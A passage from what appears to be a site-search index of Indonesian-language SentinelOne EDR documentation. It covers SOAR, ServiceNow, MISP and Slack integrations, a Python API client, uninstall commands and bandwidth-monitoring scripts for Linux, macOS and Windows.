Architecture","text":"<pre><code>flowchart LR\n    subgraph \"Phantom Playbook\"\n        TRIGGER[\"SentinelOne Alert&lt;br/&gt;Webhook Trigger\"]\n        ENRICH[\"Threat Enrichment&lt;br/&gt;Get IOCs\"]\n        DECIDE[\"Decision Node&lt;br/&gt;Risk Assessment\"]\n        ISOLATE[\"Isolate Endpoint&lt;br/&gt;SentinelOne Action\"]\n        TICKET[\"Create Ticket&lt;br/&gt;ServiceNow\"]\n        NOTIFY[\"Notify Team&lt;br/&gt;Slack/Email\"]\n    end\n\n    TRIGGER --&gt; ENRICH\n    ENRICH --&gt; DECIDE\n    DECIDE --&gt;|\"High Risk\"| ISOLATE\n    DECIDE --&gt;|\"Medium Risk\"| TICKET\n    ISOLATE --&gt; TICKET\n    TICKET --&gt; NOTIFY\n\n    style TRIGGER fill:#e3f2fd\n    style DECIDE fill:#fff3e0\n    style ISOLATE fill:#ffebee</code></pre>"},{"location":"integration/third-party-integration/#phantom-playbook-example","title":"Phantom Playbook Example","text":"<pre><code># Phantom Playbook for SentinelOne Alert Response\ndef on_start(container, summary):\n    phantom.debug('Starting SentinelOne Alert Response Playbook')\n\n    # Get alert details from SentinelOne\n    get_threat_details(container=container)\n\ndef get_threat_details(action=None, success=None, container=None, results=None, handle=None):\n    # Query SentinelOne API for threat details\n    parameters = [{\n        'threat_id': container['data']['threatInfo']['threatId']\n    }]\n\n    phantom.act('get threat', parameters=parameters, \n                app='sentinelone', callback=enrich_with_threat_intel)\n\ndef enrich_with_threat_intel(action=None, success=None, container=None, results=None, handle=None):\n    # Enrich with external threat intelligence\n    if success:\n        threat_data = results[0]['data']\n        # Continue with enrichment logic...\n        decide_response_action(container, threat_data)\n\ndef decide_response_action(container, threat_data):\n    risk_score = calculate_risk_score(threat_data)\n\n    if risk_score &gt;= 8:\n        isolate_endpoint(container, threat_data)\n    elif risk_score &gt;= 5:\n        create_incident_ticket(container, threat_data)\n    else:\n        log_for_monitoring(container, threat_data)\n</code></pre>"},{"location":"integration/third-party-integration/#22-cortex-xsoar-integration","title":"2.2 Cortex XSOAR Integration","text":""},{"location":"integration/third-party-integration/#xsoar-playbook-yaml","title":"XSOAR Playbook YAML","text":"<pre><code>id: SentinelOne-Threat-Response\nversion: -1\nname: SentinelOne Threat Response\ndescription: Automated response to SentinelOne threats\ntasks:\n  \"0\":\n    id: \"0\"\n    type: start\n    task:\n      id: eb9c3dd0-7e51-4b8e-8a2f-6c1234567890\n      version: -1\n      name: \"\"\n    nexttasks:\n      '#none#':\n      - \"1\"\n  \"1\":\n    id: \"1\"\n    type: regular\n    task:\n      id: ab1c3dd0-7e51-4b8e-8a2f-6c1234567890\n      version: -1\n      name: Get Threat Details\n      script: SentinelOne|||sentinelone-get-threat\n    nexttasks:\n      '#none#':\n      - \"2\"\n  \"2\":\n    id: \"2\"\n    type: condition\n    task:\n      id: cd2c3dd0-7e51-4b8e-8a2f-6c1234567890\n      version: -1\n      name: Risk Assessment\n    conditions:\n    - label: High Risk\n      condition:\n      - - left:\n            value:\n              simple: ${SentinelOne.Threat.RiskScore}\n          operator: greaterThanOrEqual\n          right:\n            value: \"8\"\n    - label: Medium Risk\n      condition:\n      - - left:\n            value:\n              simple: ${SentinelOne.Threat.RiskScore}\n          operator: greaterThanOrEqual\n          right:\n            value: \"5\"\n</code></pre>"},{"location":"integration/third-party-integration/#itsm-integration","title":"\ud83d\udccb ITSM Integration","text":""},{"location":"integration/third-party-integration/#31-servicenow-integration","title":"3.1 ServiceNow Integration","text":""},{"location":"integration/third-party-integration/#servicenow-flow-design","title":"ServiceNow Flow Design","text":"<pre><code>flowchart TD\n    S1_ALERT[\"SentinelOne Alert\"] --&gt; WEBHOOK[\"ServiceNow Webhook\"]\n    WEBHOOK --&gt; PARSE[\"Parse JSON Payload\"]\n    PARSE --&gt; CLASSIFY[\"Auto-Classify Incident\"]\n    CLASSIFY --&gt; CREATE[\"Create Incident Record\"]\n    CREATE --&gt; ENRICH[\"Enrich with CMDB Data\"]\n    ENRICH --&gt; ASSIGN[\"Auto-Assign to Queue\"]\n    ASSIGN --&gt; NOTIFY[\"Notify Assigned Team\"]\n\n    NOTIFY --&gt; INVESTIGATE[\"Analyst Investigation\"]\n    INVESTIGATE --&gt; UPDATE_S1[\"Update SentinelOne\"]\n    UPDATE_S1 --&gt; RESOLVE[\"Resolve Incident\"]\n\n    style S1_ALERT fill:#e3f2fd\n    style CREATE fill:#e8f5e8\n    style INVESTIGATE fill:#fff3e0</code></pre>"},{"location":"integration/third-party-integration/#servicenow-integration-script","title":"ServiceNow Integration Script","text":"<pre><code>// ServiceNow Business Rule for SentinelOne Integration\n(function executeRule(current, previous /*null when async*/) {\n\n    // Parse SentinelOne webhook data\n    var payload = JSON.parse(current.u_webhook_payload);\n\n    // Create incident from SentinelOne alert\n    var incident = new GlideRecord('incident');\n    incident.initialize();\n\n    // Map SentinelOne fields to ServiceNow\n    incident.short_description = 'SentinelOne Alert: ' + payload.threatInfo.threatName;\n    incident.description = buildDescription(payload);\n    incident.urgency = mapSeverityToUrgency(payload.ruleInfo.severity);\n    incident.category = 'Security';\n    incident.subcategory = 'Endpoint Security';\n    incident.u_source = 'SentinelOne';\n    incident.u_threat_id = payload.threatInfo.threatId;\n    incident.u_endpoint_name = payload.agentRealtimeInfo.agentComputerName;\n\n    // Auto-assign based on threat type\n    incident.assignment_group = getAssignmentGroup(payload.threatInfo.threatName);\n\n    incident.insert();\n\n    // Send notification to SentinelOne\n    updateSentinelOneTicket(payload.threatInfo.threatId, incident.number);\n\n})(current, previous);\n\nfunction buildDescription(payload) {\n    var desc = 'Threat Details:\\n';\n    desc += 'Threat Name: ' + payload.threatInfo.threatName + '\\n';\n    desc += 'File Path: ' + payload.threatInfo.filePath + '\\n';\n    desc += 'Endpoint: ' + payload.agentRealtimeInfo.agentComputerName + '\\n';\n    desc += 'User: ' + payload.agentRealtimeInfo.loggedInUsers + '\\n';\n    desc += 'Detection Time: ' + payload.threatInfo.createdAt + '\\n';\n    return desc;\n}\n</code></pre>"},{"location":"integration/third-party-integration/#threat-intelligence-integration","title":"\ud83d\udd12 Threat Intelligence Integration","text":""},{"location":"integration/third-party-integration/#41-misp-integration-architecture","title":"4.1 MISP Integration Architecture","text":"<pre><code>flowchart TB\n    subgraph \"Threat Intelligence Flow\"\n        MISP_DB[\"MISP Database&lt;br/&gt;Threat Intelligence\"]\n        MISP_API[\"MISP API&lt;br/&gt;IOC Distribution\"]\n\n        S1_INTEL[\"SentinelOne&lt;br/&gt;Threat Intel Module\"]\n        S1_ENGINE[\"Detection Engine&lt;br/&gt;IOC Matching\"]\n\n        FEEDS[\"External Feeds&lt;br/&gt;Commercial/Open Source\"]\n        ANALYST[\"Threat Analyst&lt;br/&gt;Manual Input\"]\n    end\n\n    subgraph \"Detection &amp; Response\"\n        ENDPOINTS[\"Protected Endpoints\"]\n        ALERTS[\"Threat Alerts\"]\n        HUNTING[\"Threat Hunting\"]\n    end\n\n    FEEDS --&gt; MISP_DB\n    ANALYST --&gt; MISP_DB\n\n    MISP_DB --&gt; MISP_API\n    MISP_API --&gt;|\"IOC Pull\"| S1_INTEL\n    S1_INTEL --&gt; S1_ENGINE\n\n    S1_ENGINE --&gt; ENDPOINTS\n    ENDPOINTS --&gt; ALERTS\n    ALERTS --&gt;|\"New IOCs\"| S1_INTEL\n    S1_INTEL --&gt;|\"IOC Push\"| MISP_API\n\n    S1_ENGINE --&gt; HUNTING\n\n    style MISP_DB fill:#e3f2fd\n    style S1_ENGINE fill:#e8f5e8\n    style ALERTS fill:#fff3e0</code></pre>"},{"location":"integration/third-party-integration/#42-misp-configuration","title":"4.2 MISP Configuration","text":"<pre><code># Configure MISP integration in SentinelOne\nsudo sentinelctl threat-intel misp configure \\\n  --url \"https://misp.company.com\" \\\n  --auth-key \"your-misp-auth-key\" \\\n  --pull-interval \"1h\" \\\n  --push-detections true \\\n  --threat-level \"2\" \\\n  --tags \"sentinelone,edr,automated\"\n\n# Test MISP connection\nsudo sentinelctl threat-intel misp test\n\n# Manual IOC pull\nsudo sentinelctl threat-intel misp pull --last-days 7\n</code></pre>"},{"location":"integration/third-party-integration/#communication-integration","title":"\ud83d\udcf1 Communication Integration","text":""},{"location":"integration/third-party-integration/#51-slack-integration","title":"5.1 Slack Integration","text":""},{"location":"integration/third-party-integration/#slack-bot-configuration","title":"Slack Bot Configuration","text":"<pre><code># SentinelOne Slack Bot Integration\nimport slack_sdk\nfrom slack_sdk import WebClient\nfrom slack_sdk.errors import SlackApiError\n\nclass SentinelOneSlackBot:\n    def __init__(self, token):\n        self.client = WebClient(token=token)\n\n    def send_threat_alert(self, threat_data):\n        blocks = self.build_threat_blocks(threat_data)\n\n        try:\n            response = self.client.chat_postMessage(\n                channel='#security-alerts',\n                blocks=blocks,\n                text=f\"SentinelOne Alert: {threat_data['threatName']}\"\n            )\n        except SlackApiError as e:\n            print(f\"Error sending message: {e}\")\n\n    def build_threat_blocks(self, threat_data):\n        return [\n            {\n                \"type\": \"header\",\n                \"text\": {\n                    \"type\": \"plain_text\",\n                    \"text\": f\"\ud83d\udea8 SentinelOne Threat Alert\"\n                }\n            },\n            {\n                \"type\": \"section\",\n                \"fields\": [\n                    {\n                        \"type\": \"mrkdwn\",\n                        \"text\": f\"*Threat:* {threat_data['threatName']}\"\n                    },\n                    {\n                        \"type\": \"mrkdwn\",\n                        \"text\": f\"*Endpoint:* {threat_data['endpointName']}\"\n                    },\n                    {\n                        \"type\": \"mrkdwn\",\n                        \"text\": f\"*Severity:* {threat_data['severity']}\"\n                    },\n                    {\n                        \"type\": \"mrkdwn\",\n                        \"text\": f\"*Status:* {threat_data['status']}\"\n                    }\n                ]\n            },\n            {\n                \"type\": \"actions\",\n                \"elements\": [\n                    {\n                        \"type\": \"button\",\n                        \"text\": {\n                            \"type\": \"plain_text\",\n                            \"text\": \"View in Console\"\n                        },\n                        \"url\": threat_data['consoleUrl']\n                    },\n                    {\n                        \"type\": \"button\",\n                        \"text\": {\n                            \"type\": \"plain_text\",\n                            \"text\": \"Isolate Endpoint\"\n                        },\n                        \"action_id\": \"isolate_endpoint\",\n                        \"value\": threat_data['threatId']\n                    }\n                ]\n            }\n        ]\n</code></pre>"},{"location":"integration/third-party-integration/#api-integration-framework","title":"\u2699\ufe0f API Integration Framework","text":""},{"location":"integration/third-party-integration/#61-sentinelone-api-overview","title":"6.1 SentinelOne API Overview","text":"<pre><code>flowchart LR\n    subgraph \"API Authentication\"\n        API_TOKEN[\"API Token&lt;br/&gt;Bearer Authentication\"]\n        RATE_LIMIT[\"Rate Limiting&lt;br/&gt;100 req/min\"]\n    end\n\n    subgraph \"API Endpoints\"\n        THREATS[\"Threats API&lt;br/&gt;/threats\"]\n        AGENTS[\"Agents API&lt;br/&gt;/agents\"]\n        ACTIVITIES[\"Activities API&lt;br/&gt;/activities\"]\n        POLICIES[\"Policies API&lt;br/&gt;/policies\"]\n        USERS[\"Users API&lt;br/&gt;/users\"]\n    end\n\n    subgraph \"Data Formats\"\n        JSON_REQ[\"JSON Request&lt;br/&gt;Content-Type: application/json\"]\n        JSON_RESP[\"JSON Response&lt;br/&gt;Structured Data\"]\n        WEBHOOK[\"Webhook&lt;br/&gt;Real-time Events\"]\n    end\n\n    API_TOKEN --&gt; THREATS\n    API_TOKEN --&gt; AGENTS\n    API_TOKEN --&gt; ACTIVITIES\n    API_TOKEN --&gt; POLICIES\n    API_TOKEN --&gt; USERS\n\n    THREATS --&gt; JSON_RESP\n    AGENTS --&gt; JSON_RESP\n    ACTIVITIES --&gt; JSON_RESP\n\n    JSON_REQ --&gt; THREATS\n    WEBHOOK --&gt; JSON_RESP\n\n    RATE_LIMIT -.-&gt; API_TOKEN\n\n    style API_TOKEN fill:#e3f2fd\n    style JSON_RESP fill:#e8f5e8\n    style WEBHOOK fill:#fff3e0</code></pre>"},{"location":"integration/third-party-integration/#62-api-integration-template","title":"6.2 API Integration Template","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"\nSentinelOne API Integration Template\nAuthor: Security Team\nVersion: 1.0\n\"\"\"\n\nimport requests\nimport json\nfrom datetime import datetime, timedelta\nimport logging\n\nclass SentinelOneAPI:\n    def __init__(self, console_url, api_token):\n        self.console_url = console_url.rstrip('/')\n        self.api_token = api_token\n        self.session = requests.Session()\n        self.session.headers.update({\n            'Authorization': f'ApiToken {api_token}',\n            'Content-Type': 'application/json'\n        })\n\n        # Setup logging\n        logging.basicConfig(level=logging.INFO)\n        self.logger = logging.getLogger(__name__)\n\n    def get_threats(self, limit=100, created_after=None):\n        \"\"\"Get threats from SentinelOne\"\"\"\n        url = f\"{self.console_url}/web/api/v2.1/threats\"\n        params = {'limit': limit}\n\n        if created_after:\n            params['createdAt__gte'] = created_after.isoformat()\n\n        try:\n            response = self.session.get(url, params=params)\n            response.raise_for_status()\n            return response.json()\n        except requests.exceptions.RequestException as e:\n            self.logger.error(f\"Error fetching threats: {e}\")\n            return None\n\n    def isolate_endpoint(self, agent_id, reason=\"Security incident\"):\n        \"\"\"Isolate an endpoint\"\"\"\n        url = f\"{self.console_url}/web/api/v2.1/agents/actions/disconnect\"\n        payload = {\n            'filter': {'ids': [agent_id]},\n            'data': {'reason': reason}\n        }\n\n        try:\n            response = self.session.post(url, json=payload)\n            response.raise_for_status()\n            return response.json()\n        except requests.exceptions.RequestException as e:\n            self.logger.error(f\"Error isolating endpoint: {e}\")\n            return None\n\n    def create_webhook(self, webhook_url, events):\n        \"\"\"Create webhook for real-time events\"\"\"\n        url = f\"{self.console_url}/web/api/v2.1/settings/webhooks\"\n        payload = {\n            'url': webhook_url,\n            'events': events,\n            'active': True\n        }\n\n        try:\n            response = self.session.post(url, json=payload)\n            response.raise_for_status()\n            return response.json()\n        except requests.exceptions.RequestException as e:\n            self.logger.error(f\"Error creating webhook: {e}\")\n            return None\n\n# Usage Example\nif __name__ == \"__main__\":\n    # Initialize API client\n    s1_api = SentinelOneAPI(\n        console_url=\"https://your-tenant.sentinelone.net\",\n        api_token=\"your-api-token\"\n    )\n\n    # Get recent threats\n    yesterday = datetime.now() - timedelta(days=1)\n    threats = s1_api.get_threats(created_after=yesterday)\n\n    if threats:\n        print(f\"Found {threats['pagination']['totalItems']} threats\")\n        for threat in threats['data']:\n            print(f\"Threat: {threat['threatInfo']['threatName']}\")\n            print(f\"Endpoint: {threat['agentRealtimeInfo']['agentComputerName']}\")\n</code></pre>"},{"location":"integration/third-party-integration/#integration-testing-validation","title":"\ud83d\udd27 Integration Testing &amp; Validation","text":""},{"location":"integration/third-party-integration/#testing-framework","title":"Testing Framework","text":"<pre><code>#!/bin/bash\n# Integration Testing Script\n\necho \"=== SentinelOne Integration Testing Framework ===\"\n\n# Test SIEM Integration\necho \"Testing SIEM Integration...\"\nsudo sentinelctl integration splunk test\nsudo sentinelctl integration qradar test\n\n# Test SOAR Integration\necho \"Testing SOAR Integration...\"\nsudo sentinelctl integration phantom test\nsudo sentinelctl integration xsoar test\n\n# Test ITSM Integration\necho \"Testing ITSM Integration...\"\nsudo sentinelctl integration servicenow test\nsudo sentinelctl integration jira test\n\n# Test Communication Integration\necho \"Testing Communication Integration...\"\nsudo sentinelctl integration slack test\nsudo sentinelctl integration teams test\n\necho \"\u2705 All integration tests completed\"\n</code></pre>"},{"location":"integration/third-party-integration/#validation-checklist","title":"Validation Checklist","text":"<ul> <li>[ ] SIEM Integration: Events flowing to SIEM platforms</li> <li>[ ] SOAR Integration: Automated playbooks triggered</li> <li>[ ] ITSM Integration: Tickets created automatically</li> <li>[ ] Threat Intel: IOCs synchronized bidirectionally</li> <li>[ ] Communication: Notifications sent to teams</li> <li>[ ] API Integration: Custom integrations functional</li> <li>[ ] Webhook Integration: Real-time events received</li> <li>[ ] Performance: Integration latency acceptable</li> </ul> <p>Untuk bantuan lebih lanjut dengan integrasi, hubungi Security Team atau rujuk ke SentinelOne API Documentation.</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"management/uninstall-edr/","title":"Uninstall SentinelOne EDR","text":"<p>Panduan lengkap untuk menghapus agen SentinelOne EDR dari endpoint atau server dengan berbagai metode dan sistem operasi.</p> <p>Dokumentasi Lengkap</p> <p>Panduan uninstall yang komprehensif dengan berbagai metode untuk setiap platform telah dipindahkan ke halaman instalasi untuk memudahkan referensi.</p> <p>\u27a1\ufe0f Lihat Panduan Uninstall Lengkap di Halaman Instalasi</p>"},{"location":"management/uninstall-edr/#quick-reference","title":"Quick Reference","text":"<p>Berikut adalah perintah uninstall cepat untuk setiap platform:</p>"},{"location":"management/uninstall-edr/#windows","title":"Windows","text":"<pre><code>\"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" uninstall\n</code></pre>"},{"location":"management/uninstall-edr/#linux","title":"Linux","text":"<pre><code>sudo /opt/sentinelone/bin/sentinelctl uninstall\n</code></pre>"},{"location":"management/uninstall-edr/#macos","title":"macOS","text":"<pre><code>sudo /Library/Sentinelone/sentinel/bin/sentinelctl uninstall\n</code></pre> <p>Penting Sebelum Uninstall</p> <ul> <li>Pastikan backup konfigurasi jika diperlukan</li> <li>Siapkan alternatif keamanan untuk menggantikan SentinelOne</li> <li>Dapatkan passphrase dari administrator jika diperlukan</li> <li>Dokumentasikan endpoint yang akan di-uninstall</li> </ul>"},{"location":"management/uninstall-edr/#kapan-perlu-uninstall","title":"Kapan Perlu Uninstall","text":"<ul> <li>Migrasi ke solusi keamanan lain</li> <li>Troubleshooting agent yang bermasalah</li> <li>Decommissioning endpoint</li> <li>Upgrade major version (dalam beberapa kasus)</li> <li>Compliance requirement khusus</li> </ul>"},{"location":"management/uninstall-edr/#post-uninstall-checklist","title":"Post-Uninstall Checklist","text":"<ul> <li>[ ] Verifikasi agent sudah tidak muncul di Management Console</li> <li>[ ] Pastikan semua service SentinelOne telah berhenti</li> <li>[ ] Periksa tidak ada file sisa di sistem</li> <li>[ ] Update dokumentasi inventory endpoint</li> <li>[ ] Implementasikan solusi keamanan alternatif</li> </ul> <p>Untuk panduan lengkap dengan berbagai metode uninstall, troubleshooting, dan verification steps, silakan kunjungi:</p> <p>\ud83d\udccb Panduan Uninstall Lengkap</p> <p>Hubungi Security Team jika mengalami kesulitan dalam proses uninstall.</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"monitoring/bandwidth-utilization/","title":"Bandwidth Utilization Monitoring","text":""},{"location":"monitoring/bandwidth-utilization/#konsep-bandwidth-monitoring-sentinelone","title":"\ud83c\udf10 Konsep Bandwidth Monitoring SentinelOne","text":"<p>Bandwidth monitoring SentinelOne EDR melibatkan pemahaman pola traffic antara endpoint dan SentinelOne cloud untuk optimasi jaringan dan mencegah bottleneck.</p> <pre><code>flowchart LR\n    subgraph \"Endpoint\"\n        AGENT[\"SentinelOne Agent\"]\n    end\n\n    subgraph \"Data Flow\"\n        OUTBOUND[\"Outbound Traffic&lt;br/&gt;- Telemetry&lt;br/&gt;- Security Events&lt;br/&gt;- Activity Logs\"]\n        INBOUND[\"Inbound Traffic&lt;br/&gt;- Policy Updates&lt;br/&gt;- Signatures&lt;br/&gt;- Commands\"]\n    end\n\n    subgraph \"Cloud\"\n        CONSOLE[\"Management Console\"]\n    end\n\n    AGENT --&gt; OUTBOUND\n    INBOUND --&gt; AGENT\n    OUTBOUND --&gt; CONSOLE\n    CONSOLE --&gt; INBOUND\n\n    style AGENT fill:#e3f2fd\n    style CONSOLE fill:#f3e5f5\n    style OUTBOUND fill:#fff3e0\n    style INBOUND fill:#e8f5e8</code></pre>"},{"location":"monitoring/bandwidth-utilization/#traffic-categories-bandwidth-usage","title":"\ud83d\udcca Traffic Categories &amp; Bandwidth Usage","text":"\ud83d\ude80 Normal Bandwidth Usage <p>Heartbeat: 1-5 KB/min (keep-alive)</p> <p>Telemetry: 10-50 KB/min (performance metrics)</p> <p>Policy Updates: 100-500 KB/hour (configuration)</p> <p>Signature Updates: 1-10 MB/day (threat intelligence)</p> <p>Event Upload: Variable (depends on activity)</p>"},{"location":"monitoring/bandwidth-utilization/#console-based-bandwidth-monitoring","title":"\ud83d\udcc8 Console-Based Bandwidth Monitoring","text":""},{"location":"monitoring/bandwidth-utilization/#management-console-workflow","title":"\ud83c\udfaf Management Console Workflow","text":"<pre><code>flowchart LR\n    A[Access Console] --&gt; B[Network Analytics]\n    B --&gt; C[Select Time Range]\n    C --&gt; D[Traffic Analysis]\n    D --&gt; E[Configure Limits]\n\n    style A fill:#e3f2fd\n    style E fill:#fff3e0</code></pre> <p>Console Monitoring Steps:</p> <ol> <li> <p>Dashboard Access <pre><code>Console \u2192 Network \u2192 Bandwidth Monitoring\nView: Real-time usage graphs\nFilter: By site, endpoint group, or individual agent\n</code></pre></p> </li> <li> <p>Traffic Analysis <pre><code>Time Range: Last 24 hours / 7 days / 30 days\nMetrics: Upload/Download volumes\nPeak Times: Identify high-usage periods\n</code></pre></p> </li> <li> <p>Bandwidth Optimization <pre><code>Settings \u2192 Network \u2192 Bandwidth Control\nUpload Limit: Set max KB/s per endpoint\nSchedule: Configure off-hours for updates\n</code></pre></p> </li> </ol>"},{"location":"monitoring/bandwidth-utilization/#endpoint-based-network-monitoring","title":"\ud83d\udd27 Endpoint-Based Network Monitoring","text":""},{"location":"monitoring/bandwidth-utilization/#command-line-network-analysis","title":"\ud83d\udcbb Command Line Network Analysis","text":"<pre><code>flowchart TD\n    subgraph \"Endpoint Network Monitoring Tools\"\n        subgraph \"Connection Monitoring (Linux/macOS)\"\n            NETSTAT[\"netstat -tupln&lt;br/&gt;Active Connections\"]\n            SS[\"ss -tuln&lt;br/&gt;Socket Statistics\"]\n            LSOF[\"lsof -i&lt;br/&gt;Network Files\"]\n        end\n\n        subgraph \"Connection Monitoring (Windows)\"\n            WIN_NETSTAT[\"netstat -an&lt;br/&gt;Active Connections\"]\n            WIN_NETSH[\"netsh interface show&lt;br/&gt;Interface Stats\"]\n            WIN_PS[\"Get-NetTCPConnection&lt;br/&gt;PowerShell Network\"]\n        end\n\n        subgraph \"Traffic Analysis\"\n            IFTOP[\"iftop (Linux)&lt;br/&gt;Real-time Traffic\"]\n            NLOAD[\"nload (Linux)&lt;br/&gt;Bandwidth Usage\"]\n            WIN_PERFMON[\"Performance Monitor&lt;br/&gt;Windows Counters\"]\n        end\n\n        subgraph \"SentinelOne Specific\"\n            S1_CONN[\"SentinelOne Connections&lt;br/&gt;Active Sessions\"]\n            S1_TRAFFIC[\"Traffic Volume&lt;br/&gt;Data Transfer\"]\n            S1_ENDPOINTS[\"API Endpoints&lt;br/&gt;Cloud Destinations\"]\n        end\n\n        NETSTAT --&gt; S1_CONN\n        WIN_NETSTAT --&gt; S1_CONN\n        IFTOP --&gt; S1_TRAFFIC\n        WIN_PERFMON --&gt; S1_TRAFFIC\n        SS --&gt; S1_ENDPOINTS\n        WIN_PS --&gt; S1_ENDPOINTS\n    end\n\n    style NETSTAT fill:#e3f2fd\n    style WIN_NETSTAT fill:#f3e5f5\n    style IFTOP fill:#e8f5e8\n    style WIN_PERFMON fill:#fff3e0\n    style S1_CONN fill:#e8f5e8</code></pre>"},{"location":"monitoring/bandwidth-utilization/#network-monitoring-script","title":"\ud83d\udcca Network Monitoring Script","text":"Linux/macOS ScriptWindows PowerShell ScriptCross-Platform Detection Script <pre><code>#!/bin/bash\necho \"=== SENTINELONE BANDWIDTH MONITORING (Linux/macOS) ===\"\n\n# Function to convert bytes to human readable format\nbytes_to_human() {\n    local bytes=$1\n    if [ $bytes -gt 1073741824 ]; then\n        echo \"$(echo \"scale=2; $bytes/1073741824\" | bc) GB\"\n    elif [ $bytes -gt 1048576 ]; then\n        echo \"$(echo \"scale=2; $bytes/1048576\" | bc) MB\"\n    elif [ $bytes -gt 1024 ]; then\n        echo \"$(echo \"scale=2; $bytes/1024\" | bc) KB\"\n    else\n        echo \"${bytes} B\"\n    fi\n}\n\n# Check SentinelOne network connections\necho \"=== SentinelOne Network Connections ===\"\nnetstat -tupln | grep sentinelone | head -10\n\n# Monitor network interface statistics\necho -e \"\\n=== Network Interface Statistics ===\"\nif [ -f /proc/net/dev ]; then\n    echo \"Interface | RX Bytes | TX Bytes | RX Packets | TX Packets\"\n    echo \"----------|----------|----------|------------|------------\"\n\n    cat /proc/net/dev | grep -E 'eth0|ens|enp|wlan' | while IFS=':' read -r interface stats; do\n        interface=$(echo $interface | xargs)\n        stats_array=($stats)\n        rx_bytes=${stats_array[0]}\n        rx_packets=${stats_array[1]}\n        tx_bytes=${stats_array[8]}\n        tx_packets=${stats_array[9]}\n\n        printf \"%-9s | %-8s | %-8s | %-10s | %-11s\\n\" \\\n            \"$interface\" \\\n            \"$(bytes_to_human $rx_bytes)\" \\\n            \"$(bytes_to_human $tx_bytes)\" \\\n            \"$rx_packets\" \\\n            \"$tx_packets\"\n    done\nfi\n\n# Check SentinelOne cloud connectivity\necho -e \"\\n=== SentinelOne Cloud Connectivity ===\"\nCLOUD_ENDPOINTS=(\n    \"api.sentinelone.net\"\n    \"updates.sentinelone.net\"\n    \"telemetry.sentinelone.net\"\n)\n\nfor endpoint in \"${CLOUD_ENDPOINTS[@]}\"; do\n    if ping -c 1 -W 3 \"$endpoint\" &gt;&amp;/dev/null; then\n        RTT=$(ping -c 1 -W 3 \"$endpoint\" 2&gt;/dev/null | grep 'time=' | sed 's/.*time=\\([0-9.]*\\).*/\\1/')\n        echo \"\u2705 $endpoint - RTT: ${RTT}ms\"\n    else\n        echo \"\u274c $endpoint - UNREACHABLE\"\n    fi\ndone\n\necho -e \"\\n=== Monitoring Complete ===\"\n</code></pre> <pre><code># SentinelOne Bandwidth Monitoring Script for Windows\nWrite-Host \"=== SENTINELONE BANDWIDTH MONITORING (Windows) ===\" -ForegroundColor Green\n\n# Function to convert bytes to human readable format\nfunction Convert-BytesToHuman {\n    param([long]$bytes)\n    if ($bytes -gt 1GB) {\n        return \"{0:N2} GB\" -f ($bytes / 1GB)\n    }\n    elseif ($bytes -gt 1MB) {\n        return \"{0:N2} MB\" -f ($bytes / 1MB)\n    }\n    elseif ($bytes -gt 1KB) {\n        return \"{0:N2} KB\" -f ($bytes / 1KB)\n    }\n    else {\n        return \"$bytes B\"\n    }\n}\n\n# Check SentinelOne network connections\nWrite-Host \"\\n=== SentinelOne Network Connections ===\" -ForegroundColor Yellow\n$SentinelProcesses = Get-Process | Where-Object {$_.ProcessName -like \"*Sentinel*\"}\nif ($SentinelProcesses) {\n    Get-NetTCPConnection | Where-Object {\n        $_.OwningProcess -in $SentinelProcesses.Id\n    } | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State |\n    Format-Table -AutoSize\n}\n\n# Monitor network interface statistics\nWrite-Host \"\\n=== Network Interface Statistics ===\" -ForegroundColor Yellow\nGet-NetAdapterStatistics | Where-Object {\n    $_.Name -notlike \"*Loopback*\" -and $_.Name -notlike \"*Tunnel*\"\n} | Select-Object Name, \n    @{Name=\"RX Bytes\";Expression={Convert-BytesToHuman $_.ReceivedBytes}},\n    @{Name=\"TX Bytes\";Expression={Convert-BytesToHuman $_.SentBytes}},\n    ReceivedUnicastPackets, SentUnicastPackets |\nFormat-Table -AutoSize\n\n# Check SentinelOne cloud connectivity\nWrite-Host \"\\n=== SentinelOne Cloud Connectivity ===\" -ForegroundColor Yellow\n$CloudEndpoints = @(\n    \"api.sentinelone.net\",\n    \"updates.sentinelone.net\",\n    \"telemetry.sentinelone.net\"\n)\n\nforeach ($endpoint in $CloudEndpoints) {\n    try {\n        $ping = Test-NetConnection -ComputerName $endpoint -Port 443 -InformationLevel Quiet\n        if ($ping) {\n            $latency = (Test-NetConnection -ComputerName $endpoint -InformationLevel Detailed).PingReplyDetails.RoundtripTime\n            Write-Host \"\u2705 $endpoint - RTT: ${latency}ms\" -ForegroundColor Green\n        } else {\n            Write-Host \"\u274c $endpoint - UNREACHABLE\" -ForegroundColor Red\n        }\n    }\n    catch {\n        Write-Host \"\u274c $endpoint - ERROR: $($_.Exception.Message)\" -ForegroundColor Red\n    }\n}\n\n# Check bandwidth utilization using performance counters\nWrite-Host \"\\n=== Current Bandwidth Utilization ===\" -ForegroundColor Yellow\ntry {\n    $networkCounters = Get-Counter \"\\Network Interface(*)\\Bytes Total/sec\" -SampleInterval 1 -MaxSamples 3\n    $networkCounters.CounterSamples | Where-Object {\n        $_.InstanceName -notlike \"*Loopback*\" -and $_.InstanceName -notlike \"*Tunnel*\" -and $_.CookedValue -gt 0\n    } | Select-Object InstanceName, \n        @{Name=\"Bytes/sec\";Expression={Convert-BytesToHuman $_.CookedValue}} |\n    Format-Table -AutoSize\n}\ncatch {\n    Write-Host \"Unable to retrieve network performance counters: $($_.Exception.Message)\" -ForegroundColor Red\n}\n\nWrite-Host \"\\n=== Monitoring Complete ===\" -ForegroundColor Green\n</code></pre> <pre><code>#!/bin/bash\n# Cross-platform SentinelOne network monitoring\n\ndetect_os() {\n    if [[ \"$OSTYPE\" == \"linux-gnu\"* ]]; then\n        echo \"linux\"\n    elif [[ \"$OSTYPE\" == \"darwin\"* ]]; then\n        echo \"macos\"\n    elif [[ \"$OSTYPE\" == \"msys\" ]] || [[ \"$OSTYPE\" == \"cygwin\" ]]; then\n        echo \"windows\"\n    else\n        echo \"unknown\"\n    fi\n}\n\nOS=$(detect_os)\necho \"=== SENTINELONE NETWORK MONITORING - $OS ===\"\n\ncase $OS in\n    \"linux\")\n        echo \"Running Linux network monitoring...\"\n        netstat -tupln | grep -i sentinel\n        ss -tuln | grep :443\n        ;;\n    \"macos\")\n        echo \"Running macOS network monitoring...\"\n        netstat -anp tcp | grep -i sentinel\n        lsof -i -P | grep -i sentinel\n        ;;\n    \"windows\")\n        echo \"For Windows, please run the PowerShell script above\"\n        ;;\n    